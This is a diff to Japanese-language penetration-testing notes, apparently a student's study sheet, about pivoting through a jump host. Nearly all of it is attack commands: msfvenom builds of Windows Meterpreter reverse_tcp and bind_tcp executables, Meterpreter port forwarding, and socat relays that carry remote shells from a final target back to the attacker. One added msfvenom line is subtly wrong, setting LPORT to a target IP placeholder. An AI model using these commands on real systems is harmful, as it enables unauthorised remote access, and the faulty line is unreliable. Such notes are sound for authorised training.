@@ -35,5 +35,11 @@ meterpreter > portfwd add -R -l 8080（kaliのポート）-p 1234（踏み台の
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<踏み台のIP> LPORT=1234 -f exe -o reverseshell.exe #上記のmeterpreterのポートフォワードを利用して２本目のセッションを張るペイロード。IPとポートは踏み台のもの
 
 //socat
+<リバース>
 socat TCP4-LISTEN:<踏み台ポート>,fork TCP4:<kali IP>:<kali port> #これは踏み台サーバで実行する。kaliはmulti/handlerで待ち受けて、最終ターゲットでexeを実行すればmeterpreterセッションが張れる
-上記のためのペイロードをmsfvenomで作成する際は、lhostとlportは踏み台サーバのものとする。multi/handlerの待ち受けはlhost=0.0.0.0,lport=<socatで指定したkali port>とする。
+上記のためのペイロードをmsfvenomで作成する際は、lhostとlportは踏み台サーバのもの（ターゲットとつながっているeth）とする。multi/handlerの待ち受けはlhost=0.0.0.0,lport=<socatで指定したkali port>とする。
+
+<バインド>
+socat TCP4-LISTEN:<踏み台ポート>,fork TCP4:<target IP>:<target port> #踏み台サーバで実行。
+multi/handlerのペイロードはbind_tcpを利用。set lportはsocatで指定した踏み台ポート。set rhostはkaliとつながっているethの踏み台IP。ターゲットでbindsehll.exeを実行すればセッションが張られる。
+msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o bindshell.exe LPORT=<target IP> #バインドexeのペイロード作成コマンド
